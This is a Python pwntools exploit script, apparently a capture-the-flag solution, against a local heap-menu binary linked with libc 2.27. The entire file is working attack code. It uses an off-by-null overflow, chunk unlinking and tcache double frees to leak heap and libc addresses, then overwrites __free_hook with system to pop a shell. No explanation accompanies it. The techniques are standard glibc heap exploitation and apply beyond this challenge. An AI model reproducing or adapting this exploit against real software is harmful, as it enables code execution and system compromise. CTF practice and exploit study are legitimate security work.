from pwn import *

r = process('./source')
elf = ELF('./source')
libc = ELF('/libc-2.27.so')
    
def add(size,content):
    r.sendlineafter('which command?', '1')
    r.sendlineafter('size ', str(size))
    r.sendafter('content', content)

def free(index):
    r.sendlineafter('which command?', '2')
    r.sendlineafter('index', str(index))

def show(index):
    r.sendlineafter('which command?', '3')
    r.sendlineafter('index', str(index))


for i in range(7):
    add(0xf0, '/bin/sh\x00')

add(0xf0, '/bin/sh\x00')#7
add(0xf0, '/bin/sh\x00')#8
add(0xf0, '/bin/sh\x00')#9

for i in range(7):
    free(i)

free(7)
free(8)
free(9)

for i in range(7):
    add(0xf0, '/bin/sh\x00')

add(0xf0, '/bin/sh\x00')#7
add(0xf0, '/bin/sh\x00')#8
add(0xf0, '/bin/sh\x00')#9

for i in range(7):
    free(i)

free(7)
add(0xf0, '/bin/sh\x00')#0
free(8)
add(0xf8, '/bin/sh\x00')#1 off by null
free(0) 

free(9)#unlink

for i in range(7):
    add(0xf0, '/bin/sh\x00')

add(0xf0, '/bin/sh\x00')
add(0xf0, '/bin/sh\x00')

free(0)
free(1)

show(9)
r.recvline()
r.recvuntil(' ')
heap_base = u64(r.recvuntil('\n',drop=True).ljust(8, '\x00')) - 0x310
log.success('heap_base: ' + hex(heap_base))

add(0xf0, '\x00')#0

free(2)
free(3)
free(4)
free(5)

free(0)
free(9)

add(0xf0, p64(heap_base+0x260))
add(0xf0, p64(0))
add(0x8, p64(heap_base+0xa18))

show(0)
r.recvline()
r.recvuntil(' ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8, '\x00'))
libc_base = leak-libc.symbols['__malloc_hook']-96-0x10
free_hook = libc_base+libc.symbols['__free_hook']
system = libc_base+libc.symbols['system']
log.success(hex(libc_base))
log.success(hex(free_hook))

# double free
free(1)

add(0xf0, p64(heap_base+0x260))
add(0xf0, p64(0))
add(0x8, p64(heap_base+0xa10))


free(1)
free(3)
add(0x8, p64(free_hook))
add(0xf0, '/bin/sh\x00')
add(0x8, p64(system))

free(0)

r.interactive()
